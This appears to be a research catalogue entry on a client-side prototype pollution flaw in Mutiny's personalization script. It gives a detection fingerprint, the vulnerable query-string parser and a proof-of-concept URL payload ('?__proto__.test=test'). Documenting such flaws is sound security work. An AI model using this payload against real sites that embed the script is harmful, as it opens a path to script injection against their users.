## Mutiny

URL: https://www.mutinyhq.com/

### JS Fingerprint
```
return (typeof mutiny != 'undefined')
```

### Vulnerable code fragment

https://client-registry.mutinycdn.com/personalize/client/8da34c221fc9147a.js

```js
function b(e) {
  return e.replace('?', '').split('&').reduce(function (e, t) {
    var n = t.split('='),
    r = n[0],
    i = n[1],
    o = r.split('.');
    return o.reduce(function (e, t, n) {
      return n === o.length - 1 ? e[t] = 'string' == typeof i ? unescape(i.replace('+', ' ')) : i || '' : e[t] = e[t] || {
      },
      e[t]
    }, e),
    e
  }, {
  })
}
```

### PoC
```html
<script src=https://client-registry.mutinycdn.com/personalize/client/8da34c221fc9147a.js></script>
```

```
?__proto__.test=test
```
